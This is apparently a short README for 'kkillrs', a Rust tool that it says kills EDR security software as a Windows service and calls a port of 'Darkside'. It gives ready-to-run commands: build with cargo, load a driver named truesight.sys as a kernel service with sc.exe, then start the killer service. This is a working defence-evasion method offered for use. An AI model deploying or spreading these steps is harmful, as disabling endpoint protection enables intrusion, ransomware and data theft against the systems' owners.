# kkillrs

WARNING: may cause BSODs. whoops.

It kills EDRs and stuff. Basically [Darkside](https://github.com/ph4nt0mbyt3/Darkside) but in Rust, and as a service.

## Instructions

```sh
cargo build --release
```

```bat
sc.exe create truesight.sys binPath=C:\temp\truesight.sys type=kernel
sc.exe start truesight.sys
sc.exe create kkillrs binPath=C:\temp\kkillrs.exe
sc.exe start kkillrs
```